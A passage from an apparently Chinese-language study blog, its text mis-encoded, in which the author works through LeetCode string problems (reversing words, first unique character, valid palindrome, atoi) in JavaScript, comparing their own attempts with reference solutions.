</h3><p>è¿™ä¸‹å­æ˜¯æ²¡æœ‰ä¸€ç‚¹æ€è·¯äº†ã€‚ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-12"><a href="#æ€è·¯-amp-é¢˜è§£-12" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>å¥½åƒæ˜¯é“åŠ¨æ€è§„åˆ’çš„é¢˜ç›®ï¼Œçœ‹äº†ä¸€äº›é¢˜è§£çœ‹ä¸æ‡‚å“‡ã€‚ã€‚<a href="https://leetcode-cn.com/problems/longest-palindromic-substring/solution/chao-jian-dan-de-zhong-xin-kuo-san-fa-yi-qini/">https://leetcode-cn.com/problems/longest-palindromic-substring/solution/chao-jian-dan-de-zhong-xin-kuo-san-fa-yi-qini/</a> å ä¸ªå‘ä»¥åå†çœ‹ã€‚</p><h2 id="LeetCode151â€”â€”ç¿»è½¬å­—ç¬¦ä¸²é‡Œçš„å•è¯ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode151â€”â€”ç¿»è½¬å­—ç¬¦ä¸²é‡Œçš„å•è¯ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode151â€”â€”ç¿»è½¬å­—ç¬¦ä¸²é‡Œçš„å•è¯ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode151â€”â€”ç¿»è½¬å­—ç¬¦ä¸²é‡Œçš„å•è¯ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/reverse-words-in-a-string/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -25"><a href="#è‡ªå·±çš„ä»£ç -25" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseWords = <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s=s.trim()</span><br><span class="line">  <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>()</span><br><span class="line">  <span class="keyword">var</span> arr=<span class="keyword">new</span> <span class="built_in">Array</span>()</span><br><span class="line">  <span class="keyword">var</span> count=<span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (s[i] != <span class="string">&#x27; &#x27;</span> ) &#123;</span><br><span class="line">      a.push(s[i])</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i + <span class="number">1</span>] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">      arr[count++]=a.join(<span class="string">&quot;&quot;</span>)</span><br><span class="line">      a=[]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  arr[count]=a.join(<span class="string">&quot;&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> arr.reverse().join(<span class="string">&quot; &quot;</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¦‚æœçœŸè®©è‡ªå·±æƒ³ï¼Œè‚¯å®šåšä¸å‡ºæ¥ï¼Œå› ä¸ºè¿‡ç¨‹ä¸­æ‰¾äº†æ€ä¹ˆå°†æ•°ç»„è¿æ¥å­—ç¬¦ä¸²ï¼Œæ€ä¹ˆå¾€æ•°ç»„ä¸­æ·»åŠ å­—ç¬¦ç­‰ç­‰ã€‚ç”šè‡³è¿˜å°è¯•äº†äºŒç»´æ•°ç»„ï¼Œåªèƒ½è¯´æŒæ¡å¤ªä¸å¥½äº†ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-10"><a href="#æ€è·¯1-amp-é¢˜è§£-10" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><ol><li>ä½¿ç”¨ <code>split</code> å°†å­—ç¬¦ä¸²æŒ‰ç©ºæ ¼åˆ†å‰²æˆå­—ç¬¦ä¸²æ•°ç»„ï¼›</li><li>ä½¿ç”¨ <code>reverse</code> å°†å­—ç¬¦ä¸²æ•°ç»„è¿›è¡Œåè½¬ï¼›</li><li>ä½¿ç”¨ <code>join</code> æ–¹æ³•å°†å­—ç¬¦ä¸²æ•°ç»„æ‹¼æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</li></ol><p><img src="https://i.loli.net/2021/06/14/ZiC1kM2E9msTIKF.jpg" alt="Snipaste_2021-06-14_15-14-36.jpg"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ­£åˆ™</span></span><br><span class="line"><span class="keyword">var</span> reverseWords = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.trim().split(<span class="regexp">/\s+/</span>).reverse().join(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿‡æ»¤å™¨</span></span><br><span class="line"><span class="keyword">var</span> reverseWords = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ä¹Ÿå¯ä»¥ç”¨ filter(Boolean)</span></span><br><span class="line">    <span class="keyword">return</span> s.split(<span class="string">&quot; &quot;</span>).filter(<span class="function"><span class="params">v</span> =&gt;</span> v != <span class="string">&quot;&quot;</span>).reverse().join(<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ï¼Ÿï¼Ÿï¼Ÿè¿™å°±æ˜¯è®¡ç®—æœºçš„é­…åŠ›å—ï¼Ÿ</p><h3 id="å¤æ‚åº¦åˆ†æ-17"><a href="#å¤æ‚åº¦åˆ†æ-17" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a><strong>å¤æ‚åº¦åˆ†æ</strong></h3><ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO(N)ï¼Œå…¶ä¸­ N ä¸ºè¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</li><li>ç©ºé—´å¤æ‚åº¦ï¼šO(N)ï¼Œç”¨æ¥å­˜å‚¨å­—ç¬¦ä¸²åˆ†å‰²ä¹‹åçš„ç»“æœã€‚</li></ul><h3 id="æ€è·¯2-amp-é¢˜è§£-11"><a href="#æ€è·¯2-amp-é¢˜è§£-11" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p><strong>åŒç«¯é˜Ÿåˆ—ï¼ˆä¸ä½¿ç”¨ APIï¼‰</strong>ï¼ˆä¸¤ç«¯éƒ½å¯ä»¥è¿›é˜Ÿçš„é˜Ÿåˆ—ï¼‰</p><ul><li>é¦–å…ˆå»é™¤å­—ç¬¦ä¸²å·¦å³ç©ºæ ¼</li><li>é€ä¸ªè¯»å–å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå•è¯ï¼Œä¾æ¬¡æ”¾å…¥åŒç«¯é˜Ÿåˆ—çš„å¯¹å¤´</li><li>å†å°†é˜Ÿåˆ—è½¬æ¢æˆå­—ç¬¦ä¸²è¾“å‡ºï¼ˆå·²ç©ºæ ¼ä¸ºåˆ†éš”ç¬¦ï¼‰</li></ul><p><img src="https://i.loli.net/2021/06/14/25jGUv4EWdwrqnT.jpg" alt="Snipaste_2021-06-14_15-22-42.jpg"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseWords = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">0</span></span><br><span class="line">    <span class="keyword">let</span> right = s.length - <span class="number">1</span></span><br><span class="line">    <span class="keyword">let</span> queue = []</span><br><span class="line">    <span class="keyword">let</span> word = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> (s.charAt(left) === <span class="string">&#x27; &#x27;</span>) left ++</span><br><span class="line">    <span class="keyword">while</span> (s.charAt(right) === <span class="string">&#x27; &#x27;</span>) right --</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">        <span class="keyword">let</span> char = s.charAt(left)</span><br><span class="line">        <span class="keyword">if</span> (char === <span class="string">&#x27; &#x27;</span> &amp;&amp; word) &#123;</span><br><span class="line">            queue.unshift(word)</span><br><span class="line">            word = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (char !== <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">            word += char</span><br><span class="line">        &#125;</span><br><span class="line">        left++</span><br><span class="line">    &#125;</span><br><span class="line">    queue.unshift(word)</span><br><span class="line">    <span class="keyword">return</span> queue.join(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>é€šè¿‡unshiftæ’å…¥é˜Ÿåˆ—å¤´éƒ¨ï¼Œå…¶å®è·Ÿè‡ªå·±å†™çš„<code>arr[count]</code>æŒºåƒã€‚</p><p>é€šè¿‡charAtå¾—åˆ°å­—ç¬¦ä¸²çš„å­—ç¬¦ï¼Œå¥½åƒä¹Ÿå¯ä»¥ç”¨s[i]ã€‚</p><h2 id="LeetCode387â€”â€”å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€ä¸ªå”¯ä¸€å­—ç¬¦ï¼ˆâ˜†ï¼‰"><a href="#LeetCode387â€”â€”å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€ä¸ªå”¯ä¸€å­—ç¬¦ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode387â€”â€”å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€ä¸ªå”¯ä¸€å­—ç¬¦ï¼ˆâ˜†ï¼‰"></a>LeetCode387â€”â€”å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€ä¸ªå”¯ä¸€å­—ç¬¦ï¼ˆâ˜†ï¼‰</h2><p>è·³è½¬åœ°å€</p><h3 id="è‡ªå·±çš„ä»£ç -26"><a href="#è‡ªå·±çš„ä»£ç -26" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> firstUniqChar = <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++)&#123;</span><br><span class="line">    map.set(s[i], <span class="number">0</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++)&#123;</span><br><span class="line">    <span class="keyword">const</span> x=map.get(s[i])</span><br><span class="line">    map.set(s[i],x+<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (map.get(s[i]) === <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> i</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è™½ç„¶åšå‡ºæ¥äº†ï¼Œä½†è¿˜æ˜¯googleäº†â€œå¦‚ä½•è®©mapçš„å€¼è‡ªå¢â€ï¼Œæœ€åå¾—åˆ°7ã€8è¡Œç»“æœã€‚ä¸‰æ®µå¾ªç¯çœŸåˆè‡­åˆé•¿å•Šã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-11"><a href="#æ€è·¯1-amp-é¢˜è§£-11" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><ol><li>éå†ä¸¤æ¬¡å­—ç¬¦ä¸²ï¼Œç¬¬ä¸€æ¬¡æ„é€ å“ˆå¸Œmapï¼Œ å­˜å…¥æ¯ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•°</li><li>ç¬¬äºŒæ¬¡åˆ¤æ–­æ¯ä¸ªå­—ç¬¦æ¬¡æ•°æ˜¯å¦ç­‰äº1ï¼Œç­‰äº1å°±è¿”å›i</li><li>éå†ç»“æŸï¼Œè¿”å›-1</li></ol><p>ï¼ˆå’Œè‡ªå·±æœ€åˆæƒ³çš„åŸºæœ¬ä¸€è‡´ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> firstUniqChar = <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> len = s.length;</span><br><span class="line">    <span class="keyword">const</span> map = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="comment">// ä¸‰ç›®è¿ç®—ç¬¦ï¼Œç®€æ´å¤šäº†</span></span><br><span class="line">        map[s[i]] = map[s[i]] ? map[s[i]] + <span class="number">1</span> : <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (map[s[i]] === <span class="number">1</span>) <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-12"><a href="#æ€è·¯2-amp-é¢˜è§£-12" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>å”¯ä¸€å­—ç¬¦ é¦–æ¬¡å‡ºç°ç´¢å¼• <code>=</code> è¯¥å­—ç¬¦æœ€åå‡ºç°ç´¢å¼•</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> firstUniqChar = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++) </span><br><span class="line">        <span class="keyword">if</span> (s.indexOf(s[i]) === s.lastIndexOf(s[i]))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode125â€”â€”éªŒè¯å›æ–‡ä¸²ï¼ˆâ˜†ï¼‰"><a href="#LeetCode125â€”â€”éªŒè¯å›æ–‡ä¸²ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode125â€”â€”éªŒè¯å›æ–‡ä¸²ï¼ˆâ˜†ï¼‰"></a>LeetCode125â€”â€”éªŒè¯å›æ–‡ä¸²ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/valid-palindrome/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -27"><a href="#è‡ªå·±çš„ä»£ç -27" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isPalindrome = <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.toLowerCase().split(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> n = s.length;</span><br><span class="line">  <span class="keyword">var</span> pattern = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/[a-z0-9]/</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!pattern.test(s[i])) &#123;</span><br><span class="line">      s.splice(i, <span class="number">1</span>);</span><br><span class="line">      i--</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  s = s.join(<span class="string">&quot;&quot;</span>).split(<span class="string">&quot; &quot;</span>).join(<span class="string">&quot;&quot;</span>)</span><br><span class="line">  <span class="keyword">let</span> flag = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">Math</span>.floor(s.length/<span class="number">2</span>); i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (s[i] !== s[s.length - i - <span class="number">1</span>]) &#123;</span><br><span class="line">      flag=<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤ªæŠ˜ç£¨äº†ã€‚ã€‚æ€è·¯å¾ˆç®€å•ï¼Œå°±æ˜¯å…ˆå§å­—ç¬¦ä¸²å˜æˆå…¨å°å†™çš„å­—æ¯ï¼Œç„¶åä¸€å¤´ä¸€å°¾å¯¹æ¯”ã€‚ä½†æ˜¯é‡åˆ°äº†<strong>å„ç§å„æ ·çš„é—®é¢˜</strong>ï¼šä»¥<code>&quot;A man, a plan, a canal: Panama&quot; </code>ä¸ºä¾‹ï¼š</p><ol><li>ç”¨split(â€œâ€)å»äº†ç©ºæ ¼ï¼Œä½†æ˜¯è¿˜å‰©ä¸‹ï¼Œï¼šç­‰ç‰¹æ®Šå­—ç¬¦ä¸²ã€‚</li><li>ç”¨æ­£åˆ™åŒ¹é…ï¼ŒæŠ˜è…¾äº†å¥½ä¹…å› ä¸ºç¬¬ä¸€æ¬¡ä½¿ç”¨ã€‚åæ¥æ²¡çœ‹è§é¢˜ç›®è¯´çš„æ•°å­—ï¼Œæ¡ˆä¾‹æ²¡é€šè¿‡æ‰åŠ äº†0-9ã€‚</li><li>ï¼Œï¼šç­‰ç‰¹æ®Šå­—ç¬¦ä½¿ç”¨splice()åˆ é™¤ï¼Œä½†æ˜¯åˆ é™¤ååŸæ•°ç»„é•¿åº¦å˜åŒ–ï¼Œå› æ­¤iéœ€è¦è‡ªå‡ã€‚</li><li>æ“ä½œå®Œåçš„sæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œjoin(â€œâ€)åå˜æˆ<code>Aman aplan acanal Panama</code>ï¼Œè¿˜æ˜¯æœ‰ç©ºæ ¼ã€‚æ‰€ä»¥éœ€è¦split(â€œ â€œ) å†join(â€œâ€) ï¼ˆå¥½éº»çƒ¦ï¼‰</li><li>ç„¶ååˆçŠ¯äº†ä¸ªé”™è¯¯ï¼Œåˆ¤æ–­ä¸ç›¸ç­‰æ—¶ç›´æ¥return falseäº†ï¼Œå…¶å®åº”è¯¥ç”¨flag=falseï¼Œæœ€åreturn flagå°±è¡Œã€‚</li></ol><h3 id="æ€è·¯1-amp-é¢˜è§£-12"><a href="#æ€è·¯1-amp-é¢˜è§£-12" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isPalindrome = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// s.replace(/\W/g, &quot;&quot;) ä¹Ÿå¯ä»¥è¿™æ ·ç›´æ¥åŒ¹é…éä¸€ä¸ªå•å­—å­—ç¬¦</span></span><br><span class="line">    <span class="keyword">let</span> strArr = s.replace(<span class="regexp">/[^0-9a-zA-Z]/g</span>,<span class="string">&quot;&quot;</span>).toLowerCase().split(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> strArr.join(<span class="string">&#x27;&#x27;</span>) == strArr.reverse().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>çœŸçš„ä½©æœã€‚åŸæ¥å¯ä»¥ç”¨^0-9a-zA-Zé€‰å®šæ‰€æœ‰å…¶ä»–å­—ç¬¦ã€‚è€Œä¸”æ­£åˆ™å¯ä»¥ç›´æ¥replaceï¼Œä¸ç”¨newä¸€ä¸ªpatternå†testã€‚ï¼ˆæ³¨æ„ï¼š<strong>åªæœ‰Arrayæ‰æœ‰reverse()æ–¹æ³•ï¼ŒStringæ²¡æ³•è°ƒç”¨</strong>ï¼‰</p><h3 id="æ€è·¯2-amp-é¢˜è§£-13"><a href="#æ€è·¯2-amp-é¢˜è§£-13" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>åŒæŒ‡é’ˆï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isPalindrome = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    s = s.replace(<span class="regexp">/[^0-9a-zA-Z]/g</span>,<span class="string">&#x27;&#x27;</span>).toLowerCase();</span><br><span class="line">    <span class="keyword">let</span> n = s.length;</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> right = n-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[left] != s[right])&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        left++;</span><br><span class="line">        right--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰å°±æ˜¯è´¥åœ¨äº†ç¬¬ä¸€æ­¥ã€‚æŠŠè¿™ä¸€ä¸²å­—ç¬¦å˜æˆå…¨å°å†™å­—æ¯ç«Ÿç„¶è¦èŠ±è¿™ä¹ˆå¤§åŠ›æ°”ï¼Œå“ï¼</p><h2 id="LeetCode8â€”â€”å­—ç¬¦ä¸²è½¬æ¢æ•´æ•°-atoi-ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode8â€”â€”å­—ç¬¦ä¸²è½¬æ¢æ•´æ•°-atoi-ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode8â€”â€”å­—ç¬¦ä¸²è½¬æ¢æ•´æ•° (atoi)ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode8â€”â€”å­—ç¬¦ä¸²è½¬æ¢æ•´æ•° (atoi)ï¼ˆâ˜†â˜†ï¼‰</h2><p>è·³è½¬åœ°å€</p><h3 id="è‡ªå·±çš„ä»£ç -28"><a href="#è‡ªå·±çš„ä»£ç -28" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myAtoi = <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.trim();</span><br><span class="line">  <span class="keyword">let</span> n = s.length,flag=<span class="literal">true</span>,arr=[],num=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (s[<span class="number">0</span>] === <span class="string">&quot;-&quot;</span>) &#123;</span><br><span class="line">    flag = <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[<span class="number">0</span>] === <span class="string">&quot;+&quot;</span>)&#123;</span><br><span class="line">    flag = <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isNaN</span>(s[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isNaN</span>(s[i])) &#123;</span><br><span class="line">      arr.push(s[i])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  num = <span class="built_in">Number</span>(arr.join(<span class="string">&quot;&quot;</span>));</span><br><span class="line">  <span class="comment">//console.log(num &lt; -Math.pow(2, 31))</span></span><br><span class="line">  <span class="keyword">if</span> (num &gt; <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">31</span> - <span class="number">1</span>)) &#123;</span><br><span class="line">    num=<span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">31</span> - <span class="number">1</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &lt; -<span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">31</span>)) &#123;</span><br><span class="line">    num=-<span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">31</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag?<span class="built_in">parseInt</span>(arr.join(<span class="string">&quot;&quot;</span>)):-<span class="built_in">parseInt</span>(arr.join(<span class="string">&quot;&quot;</span>))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¥½çº³é—·ã€‚ã€‚ä¸éš¾çš„ä¸€é“é¢˜ç›®å®šä¸ºmediumæœç„¶æœ‰é“ç†ã€‚å°±ä¸æ˜ç™½äº†ï¼Œä¸ºå•¥<code>console.log(num &lt; -Math.pow(2, 31)) =&gt; false</code>ï¼Œè€Œ<code>console.log(-91283472332 &lt; -2147483648) =&gt; true</code> ä¸€æ¨¡ä¸€æ ·ç»“æœå’‹ä¸åŒï¼Ÿ</p><p>å¿ƒæ€å´©äº†å‘€ï¼Œæ˜å¤©å†æ•´</p><h3 id="æ€è·¯-amp-é¢˜è§£-13"><a href="#æ€è·¯-amp-é¢˜è§£-13" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>é¢˜ç›®å³JavaScriptä¸­çš„<code>parseInt()</code>è¿™ä¸€APIçš„è½¬æ¢è§„åˆ™ï¼Œä½†è¿™æ ·å†™é¢è¯•è‚¯å®šè¿‡ä¸äº†ï¼Œè€ƒéªŒçš„æ˜¯åŸºæœ¬åŠŸã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myAtoi = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> number = <span class="built_in">parseInt</span>(str, <span class="number">10</span>); <span class="comment">// 10æœ€å¥½å†™ä¸Šï¼Œæœªé˜²æ­¢strä»¥&quot;0x&quot;æˆ–è€…&quot;0X&quot;å¼€å¤´æˆ–è€…&quot;0&quot;å¼€å¤´ã€‚</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isNaN</span>(number)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (number &lt; <span class="built_in">Math</span>.pow(-<span class="number">2</span>, <span class="number">31</span>) || number &gt; <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">31</span>) - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> number &lt; <span class="built_in">Math</span>.pow(-<span class="number">2</span>, <span class="number">31</span>) ? <span class="built_in">Math</span>.pow(-<span class="number">2</span>, <span class="number">31</span>) : <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">31</span>) - <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-14"><a href="#æ€è·¯2-amp-é¢˜è§£-14" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>æŒºæ¸…æ™°çš„ï¼Œä»¥åè¦å¤šå†™å†™ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myAtoi = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> index = <span class="number">0</span>, sign = <span class="number">1</span>, total = <span class="number">0</span>, length = str.length;</span><br><span class="line">    <span class="comment">// 1.Empty string</span></span><br><span class="line">    <span class="keyword">if</span> (length === <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 2.Remove Spaces å› ä¸º str æ˜¯ immutable çš„, æ‰€ä»¥ä½¿ç”¨ trim ä¼šå¸¦æ¥é¢å¤–çš„ç©ºé—´</span></span><br><span class="line">    <span class="keyword">while</span> (str.charAt(index) === <span class="string">&#x27; &#x27;</span> &amp;&amp; index &lt; length) &#123;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3.Handle signs</span></span><br><span class="line">    <span class="keyword">if</span> (str.charAt(index) === <span class="string">&#x27;+&#x27;</span> || str.charAt(index) === <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">        sign = str.charAt(index) === <span class="string">&#x27;-&#x27;</span> ? -<span class="number">1</span> : <span class="number">1</span>;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> 